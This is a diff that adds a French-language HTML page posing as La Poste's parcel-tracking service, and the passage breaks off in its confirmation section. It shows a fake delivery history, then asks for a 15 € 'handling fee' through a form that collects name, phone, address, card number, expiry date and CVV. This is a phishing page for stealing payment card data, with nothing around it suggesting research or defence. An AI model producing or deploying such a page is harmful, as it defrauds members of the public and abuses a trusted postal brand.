@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Suivi de Colis | La Poste</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <header>
+        <div class="container">
+            <div class="logo">
+                <h1>La Poste</h1>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="#">Suivi</a></li>
+                    <li><a href="#">Nos Services</a></li>
+                    <li><a href="#">Contact</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main class="container">
+        <!-- Section Suivi -->
+        <section id="tracking-section" class="card">
+            <h2>Suivi de votre colis</h2>
+            <div class="tracking-info">
+                <p><strong>Numéro de suivi :</strong> XYZ123456789</p>
+                <p><strong>Statut actuel :</strong> <span class="status-pending">En attente de remise en cours</span></p>
+            </div>
+            <div class="tracking-history">
+                <h3>Historique des événements</h3>
+                <ul>
+                    <li><strong>01/02/2026</strong> - Colis expédié depuis le centre de distribution de Paris</li>
+                    <li><strong>03/02/2026</strong> - Colis arrivé au centre de distribution de Lyon</li>
+                    <li><strong>05/02/2026</strong> - Colis en attente de votre action pour la remise en cours</li>
+                </ul>
+            </div>
+            <button id="proceed-to-payment-btn" class="btn-primary">Veuillez cliquer ici pour remettre la livraison en cours</button>
+        </section>
+
+        <!-- Section Paiement (cachée au début) -->
+        <section id="payment-section" class="card hidden">
+            <h2>Frais de gestion pour la remise en cours</h2>
+            <p>Pour finaliser la demande, un montant de <strong>15,00 €</strong> est requis pour les frais de traitement et de redirection.</p>
+            <form id="payment-form">
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label for="nom">Nom</label>
+                        <input type="text" id="nom" name="nom" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="prenom">Prénom</label>
+                        <input type="text" id="prenom" name="prenom" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="telephone">Numéro de téléphone</label>
+                        <input type="tel" id="telephone" name="telephone" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="adresse">Adresse</label>
+                        <input type="text" id="adresse" name="adresse" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="ville">Ville</label>
+                        <input type="text" id="ville" name="ville" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="code-postal">Code postal</label>
+                        <input type="text" id="code-postal" name="code-postal" required>
+                    </div>
+                </div>
+                
+                <hr>
+
+                <h3>Informations de paiement</h3>
+                <div class="form-group">
+                    <label for="card-number">Numéro de carte bancaire</label>
+                    <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="expiration">Date d'expiration</label>
+                        <input type="text" id="expiration" name="expiration" placeholder="MM/AA" maxlength="5" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="cvv">CVV</label>
+                        <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
+                    </div>
+                </div>
+                
+                <button type="submit" class="btn-primary">Valider le paiement de 15,00 €</button>
+            </form>
+        </section>
+
+        <!-- Section Confirmation (cachée au début) -->
+        <section id="confirmation-section" class="card hidden">
+            <h2>Paiement effectué avec succès !</h2>
+            <p>Votre demande de remise en cours a bien été prise en compte.</p>
+         
